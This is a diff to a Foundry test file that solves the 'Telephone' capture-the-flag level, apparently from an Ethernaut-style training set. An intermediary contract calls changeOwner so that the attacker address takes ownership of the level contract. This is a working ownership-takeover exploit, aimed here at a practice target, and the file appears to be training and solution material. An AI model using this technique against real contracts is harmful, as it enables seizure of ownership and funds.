@@ -2,34 +2,41 @@
 pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
-import "../src/4-Telephone.sol";
+import "./utils/BaseTest.sol";
+import "../src/levels/4-Telephone/Telephone.sol";
+import "../src/levels/4-Telephone/TelephoneFactory.sol";
 
-contract TelephoneTest is Test {
-    Telephone public telephoneCTF;
-    TelephoneAttacker public telephoneAttacker;
+contract TelephoneTest is Test, BaseTest {
+    Telephone public level;
 
-    address attacker = address(0x01);
+    constructor() {
+        levelFactory = new TelephoneFactory();
+    }
 
-    function setUp() public {
-        telephoneCTF = new Telephone();
-        telephoneAttacker = new TelephoneAttacker();
-
-        vm.deal(attacker, 100 ether);
-        vm.label(attacker, "attacker");
+    function setUp() public override {
+        super.setUp();
+        levelAddr = payable(_createLevelInstance());
+        level = Telephone(levelAddr);
     }
 
     function testAttack() public {
+        _attack();
+        _validateLevel();
+    }
+
+    function _attack() internal override {
         vm.startPrank(attacker);
 
-        // call changeOwner from attacking contract
-        telephoneAttacker.changeOwner(telephoneCTF, attacker);
+        // 1. Call changeOwner from attacking contract
+        TelephoneAttack telephoneAttack = new TelephoneAttack();
+        telephoneAttack.changeOwner(level, attacker);
 
-        assertEq(telephoneCTF.owner(), attacker);
+        vm.stopPrank();
     }
 }
 
-contract TelephoneAttacker {
-    function changeOwner(Telephone telephoneCTF, address _owner) public {
-        telephoneCTF.changeOwner(_owner);
+contract TelephoneAttack {
+    function changeOwner(Telephone level, address _owner) public {
+        level.changeOwner(_owner);
     }
 }
